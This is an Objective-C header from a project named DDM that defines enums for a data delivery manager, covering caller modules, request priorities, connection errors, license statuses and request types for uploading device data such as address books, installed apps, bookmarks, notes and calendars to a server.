//
//  DefDDM.h
//  DDM
//
//  Created by Makara Khloth on 10/13/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

typedef enum {
	kDDC_EDM,
	kDDC_AddressbookManager,
	kDDC_ActivationManager,
	kDDC_RCM,
	kDDC_SyncTimeManager,
	kDDC_SyncCDManager,
	kDDC_RunningInstalledAppsManager,
	kDDC_BookmarksManager,
	kDDC_AppsProfileManager,
	kDDC_UrlsProfileManager,
	kDDC_ApplicationEngine,
	kDDC_CalendarManager,
	kDDC_NoteManager
} DataDeliveryCaller;

typedef enum {
	kDDMRequestPriortyLow,
	kDDMRequestPriortyNormal,
	kDDMRequestPriortyHigh
} DDMRequestPriority;

// Can be able to use interchangable with ConnectionHistoryErrorType in DefConnectionHistory.h
typedef enum {
	kConnectionLogOK,
	kConnectionLogHttpError,
	kConnectionLogServerError,
	kConnectionLogApplicationError,
	kConnectionLogConnectionError,
	kConnectionLogPayloadError
} ConnectionLogError;

typedef enum {
	kDDMServerStatusOK,
	kDDMServerStatusUnknown,
	kDDMServerStatusLicenseNotFound,
	kDDMServerStatusDeviceIdNotFound,
	kDDMServerStatusLicenseExpired,
	kDDMServerStatusLicenseDisabled
} DDMServerStatus;

typedef enum {
	kEDPTypeUnknown,
	kEDPTypePanic,
	kEDPTypeSystem,
	kEDPTypeAllRegular,
	kEDPTypeSettings,
	kEDPTypeActualMeida,
	kEDPTypeThumbnail,
	kEDPTypeActivate,
	kEDPTypeDeactivate,
	kEDPTypeRequestActivate,
	kEDPTypeSendHeartbeat,
	kEDPTypeSendAddressbook,
	kEDPTypeSendAddressbookForApproval,
	kEDPTypeGetAddressbook,
	kEDPTypeGetTime,
	kEDPTypeGetCommunicationDirectives,
	kEDPTypeSendInstalledApps,
	kEDPTypeSendRunningApps,
	kEDPTypeSendBookmarks,
	kEDPTypeGetAppsProfile,
	kEDPTypeGetUrlProfile,
	kEDPTypeSendAppsProfile,
	kEDPTypeSendUrlProfile,
	kEDPTypeGetConfig,
	kEDPTypeSendNote,
	kEDPTypeSendCalendar,
	kEDPTypeNTMedia
} EDPType;

typedef enum {
	kDDMRequestExecutorStatusIdle,
	kDDMRequestExecutorStatusBusyWithRequest
} DDMRequestExecutorStatus;
